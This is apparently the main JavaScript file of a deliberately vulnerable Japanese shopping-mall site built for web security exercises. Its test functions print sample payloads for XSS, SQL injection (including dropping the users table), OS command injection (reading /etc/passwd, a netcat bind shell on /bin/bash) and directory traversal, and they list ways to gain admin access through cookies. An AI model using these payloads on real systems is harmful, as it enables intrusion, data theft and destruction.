// メインJavaScriptファイル

// ページ読み込み時の初期化
document.addEventListener("DOMContentLoaded", function () {
  console.log("🔒 脆弱なショッピングモール - ウェブセキュリティ演習サイト");
  console.log("⚠️  このサイトは学習目的のみで使用してください");

  // アラートの自動非表示
  setTimeout(function () {
    const alerts = document.querySelectorAll(".alert");
    alerts.forEach(function (alert) {
      const bsAlert = new bootstrap.Alert(alert);
      bsAlert.close();
    });
  }, 5000);

  // 脆弱性情報の表示
  showVulnerabilityInfo();
});

// 脆弱性情報の表示
function showVulnerabilityInfo() {
  const vulnerabilityInfo = document.querySelector(".vulnerability-info");
  if (vulnerabilityInfo) {
    vulnerabilityInfo.style.display = "block";
  }
}

// XSSテスト用関数
function testXSS() {
  const payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
  ];

  console.log("XSSペイロード例:");
  payloads.forEach(function (payload, index) {
    console.log(`${index + 1}. ${payload}`);
  });
}

// SQLインジェクションテスト用関数
function testSQLInjection() {
  const payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT * FROM users --",
    "'; DROP TABLE users --",
  ];

  console.log("SQLインジェクションペイロード例:");
  payloads.forEach(function (payload, index) {
    console.log(`${index + 1}. ${payload}`);
  });
}

// CSRFテスト用関数
function testCSRF() {
  console.log("CSRFテスト:");
  console.log("1. カート追加/削除");
  console.log("2. 注文処理");
  console.log("3. プロフィール更新");
}

// セッション管理テスト用関数
function testSessionManagement() {
  console.log("セッション管理テスト:");
  console.log("1. クッキー操作で管理者権限取得");
  console.log("2. セッションID予測");
  console.log("3. 強制ブラウジングで管理者ページアクセス");
}

// OSコマンド実行テスト用関数
function testOSCommand() {
  const payloads = [
    "127.0.0.1; ls -la",
    "127.0.0.1 && cat /etc/passwd",
    "127.0.0.1 | whoami",
    "127.0.0.1; nc -l 4444 -e /bin/bash",
  ];

  console.log("OSコマンド実行ペイロード例:");
  payloads.forEach(function (payload, index) {
    console.log(`${index + 1}. ${payload}`);
  });
}

// ディレクトリトラバーサルテスト用関数
function testDirectoryTraversal() {
  const payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
  ];

  console.log("ディレクトリトラバーサルペイロード例:");
  payloads.forEach(function (payload, index) {
    console.log(`${index + 1}. ${payload}`);
  });
}

// カート機能
function updateCartQuantity(itemId, quantity) {
  const form = document.createElement("form");
  form.method = "POST";
  form.action = "/cart/update";

  const itemIdInput = document.createElement("input");
  itemIdInput.type = "hidden";
  itemIdInput.name = "item_id";
  itemIdInput.value = itemId;

  const quantityInput = document.createElement("input");
  quantityInput.type = "hidden";
  quantityInput.name = "quantity";
  quantityInput.value = quantity;

  form.appendChild(itemIdInput);
  form.appendChild(quantityInput);
  document.body.appendChild(form);
  form.submit();
}

// 検索機能
function searchProducts() {
  const query = document.getElementById("search-query").value;
  if (query) {
    window.location.href = `/search?q=${encodeURIComponent(query)}`;
  }
}

// レビュー投稿
function submitReview(productId) {
  const rating = document.getElementById("rating").value;
  const comment = document.getElementById("comment").value;

  if (!rating || !comment) {
    alert("評価とコメントを入力してください");
    return;
  }

  const form = document.createElement("form");
  form.method = "POST";
  form.action = `/product/${productId}/review`;

  const ratingInput = document.createElement("input");
  ratingInput.type = "hidden";
  ratingInput.name = "rating";
  ratingInput.value = rating;

  const commentInput = document.createElement("input");
  commentInput.type = "hidden";
  commentInput.name = "comment";
  commentInput.value = comment;

  form.appendChild(ratingInput);
  form.appendChild(commentInput);
  document.body.appendChild(form);
  form.submit();
}

// APIテスト用関数
function testAPI() {
  console.log("APIテスト:");
  console.log("1. /api/products - 商品API");
  console.log("2. /api/ping - Ping API (OS Command Injection)");
  console.log("3. /api/system - システムコマンドAPI");
  console.log("4. /api/file/... - ファイルアクセスAPI (Directory Traversal)");
}

// 管理者機能テスト
function testAdmin() {
  console.log("管理者機能テスト:");
  console.log("1. クッキー操作: user_id=1");
  console.log("2. 直接アクセス: /admin");
  console.log("3. ユーザー管理: /admin/users");
  console.log("4. 注文管理: /admin/orders");
}

// 全脆弱性テスト
function runAllTests() {
  console.log("🔍 全脆弱性テスト開始");
  testXSS();
  testSQLInjection();
  testCSRF();
  testSessionManagement();
  testOSCommand();
  testDirectoryTraversal();
  testAPI();
  testAdmin();
  console.log("✅ 全脆弱性テスト完了");
}

// グローバル関数として公開
window.vulnerabilityTests = {
  testXSS: testXSS,
  testSQLInjection: testSQLInjection,
  testCSRF: testCSRF,
  testSessionManagement: testSessionManagement,
  testOSCommand: testOSCommand,
  testDirectoryTraversal: testDirectoryTraversal,
  testAPI: testAPI,
  testAdmin: testAdmin,
  runAllTests: runAllTests,
};
